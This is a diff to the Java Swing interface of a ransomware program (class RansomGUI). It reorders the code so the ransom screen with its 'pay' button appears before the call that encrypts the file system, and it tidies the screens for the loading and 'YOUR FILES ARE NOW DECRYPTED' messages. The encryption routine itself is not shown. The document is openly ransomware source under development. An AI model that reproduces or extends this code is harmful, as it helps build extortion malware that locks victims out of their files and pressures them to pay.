@@ -2,11 +2,8 @@ package Agent.ransomGUI;
 
 import java.awt.BorderLayout;
 import java.awt.Color;
-import java.awt.Graphics;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.awt.image.BufferedImage;
-
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
@@ -31,14 +28,15 @@ public class RansomGUI extends JFrame implements ActionListener {
 		this.add(panel);
 		this.setVisible(true);
 		try {
-			ransomProcess.encryptFileSystem();
+			
 			encryptionScreen();
+			ransomProcess.encryptFileSystem();
 		} catch (RansomwareException e) {
 			throw new RansomwareException("failed encrypting file system", e.getCause());
 		}
 	}
 
-	public void encryptionScreen() {
+	private void encryptionScreen() {
 
 		paidButton = new JButton("pay");
 		label.setText("<html><body dir=\"ltr\">\r\n" + "	<h1 align=\"center\">\r\n"
@@ -74,7 +72,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 	}
 
 	private void waitScreen() {
-		label.setText("");
+
 		label.setText("<html><body bgcolor=\"black\" dir=\"ltr\" >\r\n"
 				+ "<h1 align=\"center\" ><font size=\"12\" color=\"red\" face=\"Showcard Gothic\">Loading... </font></h1>\r\n"
 				+ "<br />\r\n" + "<p align=\"center\">\r\n" +
@@ -84,7 +82,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 	}
 
 	private void decryptionScreen() {
-		label.setText("");
+
 		label.setText("<html> <body bgcolor=\"black\" dir=\"ltr\">\r\n" + "\r\n"
 				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">AS WE PROMISED ,<br /> YOUR FILES ARE NOW DECRYPTED !</font></h1>\r\n"
 				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
